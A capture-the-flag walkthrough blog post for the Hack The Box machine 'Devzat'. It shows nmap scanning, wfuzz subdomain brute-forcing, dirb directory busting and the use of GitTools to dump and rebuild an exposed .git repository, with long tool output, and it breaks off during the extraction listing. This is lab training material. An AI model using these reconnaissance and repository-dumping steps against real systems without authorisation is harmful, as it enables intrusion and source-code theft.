---
layout: post
title:  "Devzat Walkthrough"
date:   2022-03-20 12:44:14 -0400
categories: boxwriteup
---

Devzat is rated at a medium box and had pretty cool stuff on it that could lead down some rabbit holes. 


### Nmap scan
```
# Nmap 7.92 scan initiated Tue Mar  8 22:37:35 2022 as: nmap -vvv -sC -sV -p- -o fullTCP.nmap 10.10.11.118
Nmap scan report for 10.10.11.118
Host is up, received reset ttl 63 (0.021s latency).
Scanned at 2022-03-08 22:37:36 EST for 49s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNaY36GNxswLsvQjgdNt0oBgiJp/OExsv55LjY72WFW03eiJrOY5hbm5AjjyePPTm2N9HO7uK230THXoGWOXhrlzT3nU/g/DkQyDcFZioiE7M2eRIK2m4egM5SYGcKvXDtQqSK86ex4I31Nq6m9EVpVWphbLfvaWjRmIgOlURo+P76WgjzZzKws42mag2zIrn5oP+ODhOW/3ta289/EMYS6phUbBd0KJIWm9ciNfKA2D7kklnuUP1ZRBe2DbSvd2HV5spoLQKmtY37JEX7aYdETjDUHvTqgkWsVCZAa5qNswPEV7zFlAJTgtW8tZsjW86Q0H49M5dUPra4BEXfZ0/idJy+jpMkbfj6+VjlsvaxxvNUEVrbPBXe9SlbeXdrNla5nenpbwtWNhckUlsEZjlpv8VnHqXt99s1mfHJkgO+yF09gvVPVdglDSqMAla8d2rfaVD68RfoGQc10Af6xiohSOA8LIa0f4Yaw+PjLlcylF5APDnSjtQvHm8TnQyRaVM=
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCenH4vaESizD5ZgkV+1Yo3MJH9MfmUdKhvU+2Z2ShSSWjp1AfRmK/U/rYaFOoeKFIjo1P4s8fz3eXr3Pzk/X80=
|   256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTxLGFW04ssWG0kheQptJmR5sHKtPI2G+zh4FVF0pBm
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://devzat.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     syn-ack ttl 63 (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|   3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTPm8Ze7iuUlabZ99t6SWJTw3spK5GP21qE/f7FOT/P+crNvZQKLuSHughKWgZH7Tku7Nmu/WxhZwVUFDpkiDG1mSPeK6uyGpuTmncComFvD3CaldFrZCNxbQ/BbWeyNVpF9szeVTwfdgY5PNoQFQ0reSwtenV6atEA5WfrZzhSZXWuWEn+7HB9C6w1aaqikPQDQSxRArcLZY5cgjNy34ZMk7MLaWciK99/xEYuNEAbR1v0/8ItVv5pyD8QMFD+s2NwHk6eJ3hqks2F5VJeqIZL2gXvBmgvQJ8fBLb0pBN6xa1xkOAPpQkrBL0pEEqKFQsdJaIzDpCBGmEL0E/DfO6Dsyq+dmcFstxwfvNO84OmoD2UArb/PxZPaOowjE47GRHl68cDIi3ULKjKoMg2QD7zrayfc7KXP8qEO0j5Xws0nXMll6VO9Gun6k9yaXkEvrFjfLucqIErd7eLtRvDFwcfw0VdflSdmfEz/NkV8kFpXm7iopTKdcwNcqjNnS1TIs=
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/8%Time=62282112%P=x86_64-pc-linux-gnu%r(NUL
SF:L,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  8 22:38:25 2022 -- 1 IP address (1 host up) scanned in 49.45 seconds
fullTCP.nmap (END)
```

When navigating to ```http://10.10.11.118``` it automatically redirects me to ```devzat.htb```.. With this being said, we can add it to our local /etc/hosts file for virtual hosting.

![[Pasted image 20220309180156.png]]

At the bottom of the page it seems we can connect to some form of a chat server on port 8000. That port also showed up on our nmap scan as SSH

![[Pasted image 20220309180341.png]]

Also we can rip a potential username out of the page source code by inspecting it within our web browser.

![[Pasted image 20220309180430.png]]

### Port 8000 - First connection
Using the syntax found on the default web page, we can connect to the chat server.

```
╭─    ~/Hackthebox/Devzat  on   master ?10 ································· ✔  at 18:02:55  ─╮
╰─ ssh -l evilman devzat.htb -p 8000                                                                   ─╯
Welcome to the chat. There are no more users
devbot: evilman has joined the chat
evilman: /heml
[SYSTEM] Command not found..? Check /help for a list of commands
evilman: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an
         example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
evilman: 
```

I spent some time fiddling with this but let's leave it alone for now as it will be a huge part of the box later on.

Futher enumerating the web server, we can find it has a subdomain by brute forcing some from a common wordlist.. Guessing game 

```
╭─    ~/Hackthebox/Devzat  on   master ?10 ···································································································· ✔  at 18:07:58  ─╮
╰─ wfuzz -c -f subdomainBF -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://devzat.htb' -H "Host: FUZZ.devzat.htb" --hw 26                ─╯
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                     
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"   
```

Wfuzz shows that the site has a subdomain of ```pets.devzat.htb```. We can add that to our /etc/hosts and browse to the site.

![[Pasted image 20220309181014.png]]

Let's fire up dirb to do some directory busting. 

```
─    ~/Hackthebox/Devzat  on   master ?10 ···································································································· ✔  at 18:09:41  ─╮
╰─ dirb http://pets.devzat.htb                                                                                                                                            ─╯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar  9 18:11:30 2022
URL_BASE: http://pets.devzat.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://pets.devzat.htb/ ----
+ http://pets.devzat.htb/.git/HEAD (CODE:200|SIZE:23)       
```

Looks like we found a .git directory! 
```
╰─ curl http://pets.devzat.htb/.git/                                                                                                                                      ─╯
<pre>
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>
<a href="HEAD">HEAD</a>
<a href="branches/">branches/</a>
<a href="config">config</a>
<a href="description">description</a>
<a href="hooks/">hooks/</a>
<a href="index">index</a>
<a href="info/">info/</a>
<a href="logs/">logs/</a>
<a href="objects/">objects/</a>
<a href="refs/">refs/</a>
</pre>

```

I will use two common tools in the next section listed here https://github.com/internetwache/GitTools
- Gitdumper.sh - using to download.git repositories from webservers which do not have directory listing enabled.
- extractor.sh - This is a script which tries to recover incomplete git repositories:
	- Iterate through all commit-objects of a repository
	- Try to restore the contents of the commit
	- Commits are _not_ sorted by date

```
   ~/Hackthebox/Devzat  on   master ?10 ···································································································· ✔  at 18:15:17  ─╮
╰─ git clone https://github.com/internetwache/GitTools.git                                                                                                                ─╯
Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 242 (delta 9), reused 14 (delta 4), pack-reused 209
Receiving objects: 100% (242/242), 56.48 KiB | 2.26 MiB/s, done.
Resolving deltas: 100% (88/88), done.

╭─    ~/Hackthebox/Devzat  on   master ?11 ···································································································· ✔  at 18:15:21  ─╮
╰─ cd GitTools                                                                                                                                                            ─╯
╭─    ~/Hackthebox/Devzat/GitTools  on   master ··························································································· INT ✘  at 18:17:08  ─╮
╰─ cd Dumper                                                                                                                                                              ─╯
╭─    ~/Hackthebox/Devzat/GitTools/Dumper  on   master ···················································································· INT ✘  at 18:17:36  ─╮
╰─ chmod +x gitdumper.sh                                                                                                                                                  ─╯

╭─    ~/Hackthebox/Devzat/GitTools/Dumper  on   master ························································································ ✔  at 18:17:41  ─╮
╰─ ./gitdumper.sh http://pets.devzat.htb/.git/ /home/kali/Hackthebox/Devzat/git                                                                                           ─╯
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/kali/Hackthebox/Devzat/git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/ef/07a04ebb2fc92cf74a39e0e4b843630666a705
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/82/74d7a547c0c3854c074579dfc359664082a8f6
[+] Downloaded: objects/46/4614f32483e1fde60ee53f5d3b4d468d80ff62
[+] Downloaded: objects/55/1abaa3c707703936e5e31b8e4645b35e5f6c07
[+] Downloaded: objects/3a/e86c86b0053b79cdbfc1456d6059986a9d3813
[+] Downloaded: objects/8d/a69971e32e6e08cae489b40731845d1de13258
[+] Downloaded: objects/93/28c7f72254a754c91fddfd3c7e62c1251a2828
[+] Downloaded: objects/2f/37bf8e3a0ce61b74fec752fad017c363511d31
[+] Downloaded: objects/69/f1153887d2790c94f23a00c6f85958cf198418
[+] Downloaded: objects/53/5028803d222b0e4e9174f56529c0ed9fece4e0
[+] Downloaded: objects/54/f95a54c49178dd5d496058e4ee99829748c49a
[+] Downloaded: objects/28/a51e070175ab78da05529ff059367df9df3e57
[+] Downloaded: objects/5b/2f2f4b425c4a753d5fb1bd01df5c2389dd95e0
[+] Downloaded: objects/d5/84aafd3a034f1f93b4c2cfa285a77798965c2d
[+] Downloaded: objects/1d/69311c0a33ed5f21e8384641b310cc24e5701c
[+] Downloaded: objects/3e/967e5015bbcd3460dd43f8acc05b3125eac4cd
[+] Downloaded: objects/68/27c53e0d5e2f69f9fa7eb4f5b4b05ee429f539
[+] Downloaded: objects/6f/3c2fa527470bae3ce951717b431c2fe5c38332
[+] Downloaded: objects/d9/2ef698d7cbc3c1014a125e4dcd53be770d5beb
[+] Downloaded: objects/b0/00a57acd3e3027fac564a394704a66c824b76d
[+] Downloaded: objects/bc/b397a0fe8794bf9f03b934812f1efee5533f34
[+] Downloaded: objects/7e/58517e9052d2ce28d12c549dc6ad30423e4c15
[+] Downloaded: objects/94/caeb6c465d2de18aa8cf364c56dd7515ea2a1a
[+] Downloaded: objects/46/24e1f42ce009c31dba5a7c05df4c74472bd5be
[+] Downloaded: objects/47/a0383d182b9413440099ee04c25954e08494e8
[+] Downloaded: objects/3c/6dd07ff39376f9d6f513b06167cc46b3a5af98
[-] Downloaded: objects/18/62645149230957031259313225746154785156
[-] Downloaded: objects/11/64153218269348144531255820766091346740
[-] Downloaded: objects/14/55191522836685180664062572759576141834
[-] Downloaded: objects/18/18989403545856475830078125909494701772
[-] Downloaded: objects/ed/11368683772161602973937988281255684341
[-] Downloaded: objects/e1/42108547152020037174224853515625710542
[-] Downloaded: objects/11/10223024625156540423631668090820312555
[-] Downloaded: objects/13/87778780781445675529539585113525390625
[-] Downloaded: objects/69/38893903907228377647697925567626953125
[-] Downloaded: objects/34/69446951953614188823848962783813476562
[-] Downloaded: objects/17/34723475976807094411924481391906738281
[-] Downloaded: objects/25/86736173798840354720596224069595336914
[-] Downloaded: objects/b4/050a850c04b3abf54132565044b0b7d7bfd8ba
[-] Downloaded: objects/27/0b39432355ffb4b70e0cbd6bb4bf7f321390b9
[-] Downloaded: objects/4a/03c1d356c21122343280d6115c1d21bd376388
[-] Downloaded: objects/b5/f723fb4c22dfe6cd4375a05a07476444d58199
[-] Downloaded: objects/ed/4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33
[-] Downloaded: objects/57/6b315ececbb6406837bf51f55ac635d8aa3a93
[-] Downloaded: objects/e7/b3ebbd55769886bc651d06b0cc53b0f63bce3c
[-] Downloaded: objects/3e/27d2604b6b17d1f2e12c4247f8bce6e563a440
[-] Downloaded: objects/26/95994666715063979466701508701962594045
[-] Downloaded: objects/78/07714424391721682722368061269599466671
[-] Downloaded: objects/50/63979466701508701963067355791626002630
[-] Downloaded: objects/ed/11579208921035624876269744694940757352
[-] Downloaded: objects/99/96955224135760342422259061068512044369
[-] Downloaded: objects/11/57920892103562487626974469494075735300
[-] Downloaded: objects/36/17de4a96262c6f5d9e98bf9292dc29f8f41dbd
[-] Downloaded: objects/28/9a147ce9da3113b5f0b8c00a60b1ce1d7e819d
[-] Downloaded: objects/7a/431d7c90ea0e5faa87ca22be8b05378eb1c71e
[-] Downloaded: objects/f3/20ad746e1d3b628ba79b9859f741e082542a38
[-] Downloaded: objects/55/02f25dbf55296c3a545e3872760ab7b3312fa7
[-] Downloaded: objects/e2/3ee7e4988e056be3f82d19181d9c6efe814112
[-] Downloaded: objects/03/14088f5013875ac656398d8a2ed19d2a85c8ed
[-] Downloaded: objects/39/40200619639447921227904010014361380507
[-] Downloaded: objects/97/39270465446667948293404245721771496870
[-] Downloaded: objects/97/39270465446667946905279627659399113263
[-] Downloaded: objects/56/9398956308152294913554433653942643c685
[-] Downloaded: objects/8e/06b70404e9cd9e3ecb662395b4429c64813905
[-] Downloaded: objects/3f/b521f828af606b4d3dbaa14b5e77efe75928fe
[-] Downloaded: objects/1d/c127a2ffa8de3348b3c1856a429bf97e7e31c2
[-] Downloaded: objects/e5/bd66051953eb9618e1c9a1f929a21a0b68540e
[-] Downloaded: objects/ea/2da725b99b315f3b8b489918ef109e15619395
[-] Downloaded: objects/1e/c7e937b1652c0bd3bb1bf073573df883d2c34f
[-] Downloaded: objects/1e/f451fd46b503f0011839296a789a3bc0045c8a
[-] Downloaded: objects/5f/b42c7d1bd998f54449579b446817afbd17273e
[-] Downloaded: objects/66/2c97ee72995ef42640c550b9013fad0761353c
[-] Downloaded: objects/e6/86479766013060971498190079908139321726
[-] Downloaded: objects/94/35300143305409394463459185543183397656
[-] Downloaded: objects/05/21225596406614545549772963113914808580
[-] Downloaded: objects/37/12198799971664381257402829111505715168
[-] Downloaded: objects/64/79766013060971498190079908139321726943
[-] Downloaded: objects/53/00143305409394463459185543183397655394
[-] Downloaded: objects/24/50577463332171975329639963713633211138
[-] Downloaded: objects/00/01020304050607080910111213141516171819
[-] Downloaded: objects/20/21222324252627282930313233343536373839
[-] Downloaded: objects/40/41424344454647484950515253545556575859
[-] Downloaded: objects/60/61626364656667686970717273747576777879
[-] Downloaded: objects/80/81828384858687888990919293949596979899
[-] Downloaded: objects/00/01123333333333444444444455666677777888
[+] Downloaded: objects/da/93220bc34984be11385afbbe6cd044e7b455eb
[+] Downloaded: objects/7b/1ba8363499e091996af78355e71d504b220312
[+] Downloaded: objects/03/cd4553f4c458eaef2f9734925b4e6e8c0d6df9
[+] Downloaded: objects/bd/7e818ef2c4c78fe5f61a0285df390aa3fa0e43
[+] Downloaded: objects/a4/04baa1852e12d51e5941285100091e9380bb03
[+] Downloaded: objects/7c/8dc57a3e2266715fac1ccdb4d677982154c16d
[+] Downloaded: objects/d5/eee74298e64b35d51a1ded2a482ae9cbbfd3c1
[+] Downloaded: objects/17/b8e146f96cd4cd6bd9d5a9215ade0e8cad656e
[+] Downloaded: objects/1b/ac702fbb64129fc77d16b3e0c6652cf2ebc852
[+] Downloaded: objects/59/b0e7c7cdc9f76c39eac534d56f2d92d1f995fe
[+] Downloaded: objects/5d/cebd6a2a7127228bf4330ae18b78785942ec19
[+] Downloaded: objects/47/7b607f55d0d610decf739027ad1cad7846e8a1
[+] Downloaded: objects/50/a0732c90552ff2e7ddd92d79fa964c0d9cd5eb
[+] Downloaded: objects/e1/e271c00e31d309e9bab411caeef86d6d6d0d57
[+] Downloaded: objects/ae/444e098873c82b664e7e6204594e5db26126ff
[+] Downloaded: objects/bb/28a9414d456a3e71bc1ffca30e95b98f6dc2f1
[+] Downloaded: objects/d0/5ea581fbbf17eb0d3139f9937ac6a8fde98685
[+] Downloaded: objects/4e/48a46697302eb89d858229ec12ad23edd9b259
[+] Downloaded: objects/fc/567cd2f11d83683d9eb4ca1a5fdc912f7d417c
[+] Downloaded: objects/db/70e73e473f8ed16d596ab0fd373f3423fc8512
[+] Downloaded: objects/b8/a8f656e1607a2c36884d3165872ef3515b5879
[+] Downloaded: objects/fa/e180dacc52937c1d6a24636431663d6754fef5
[+] Downloaded: objects/9d/ba8c340bf81622be7b48a7a3546869bfb851d4
[+] Downloaded: objects/d1/ac9ba1169e4076832034c5585e1c5bf9d6f83c
[+] Downloaded: objects/e9/f54b13d5e925602e04501415ced4bc0bc881d2
[+] Downloaded: objects/9d/f490e8cfdd75704d31f518caf76ab34494b124
[+] Downloaded: objects/af/e315244f6dae3beda0159693d25a6e0466dd90
[+] Downloaded: objects/dc/e459d0e5a832b08688e2331557535d60d8a171
[+] Downloaded: objects/f3/3e8162997aaa9da582aa81428ee87aa48953a6
[+] Downloaded: objects/73/c1a4d5d156b6ddc62a7e3eba1c206bd6ad19c8
[+] Downloaded: objects/dc/52d954d8d7f62c82cf63236d27093764a3d046

```

All of these files will be dumped into ```/home/kali/Hackthebox/Devzat/git/.git/```.. Now let's extract them into ```/home/kali/Hackthebox/Devzat/gitdump```

```
    ~/Hackthebox/Devzat/GitTools/Dumper  on   master ··········································································· ✔  took 13s   at 18:18:01  ─╮
╰─ cd ../Extractor                                                                                                                                                        ─╯

╭─    ~/Hackthebox/Devzat/GitTools/Extractor  on   master ····················································································· ✔  at 18:19:19  ─╮
╰─ chmod +x extractor.sh                                                                                                                                                  ─╯

╭─    ~/Hackthebox/Devzat/GitTools/Extractor  on   master ····················································································· ✔  at 18:19:49  ─╮
╰─ ./extractor.sh /home/kali/Hackthebox/Devzat/git /home/kali/Hackthebox/Devzat/gitdump                                                                                   ─╯
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: ef07a04ebb2fc92cf74a39e0e4b843630666a705
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/.gitignore
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/bluewhale
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/cat
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/dog
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/giraffe
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/gopher
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/characteristics/redkite
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/go.mod
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/go.sum
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/main.go
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/start.sh
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/.gitignore
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/README.md
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/package.json
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/css/all.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/css/bootstrap.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/css/global.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/favicon.ico
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/index.html
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-brands-400.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-brands-400.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-brands-400.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-brands-400.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-brands-400.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-regular-400.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-regular-400.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-regular-400.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-regular-400.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-regular-400.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-solid-900.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-solid-900.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-solid-900.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-solid-900.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/public/webfonts/fa-solid-900.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/rollup.config.js
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/App.svelte
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/0-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/main.js
[+] Found commit: 464614f32483e1fde60ee53f5d3b4d468d80ff62
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/.gitignore
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/bluewhale
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/cat
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/dog
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/giraffe
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/gopher
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/characteristics/redkite
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/go.mod
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/go.sum
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/main.go
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/start.sh
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/.gitignore
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/README.md
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/package.json
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/css
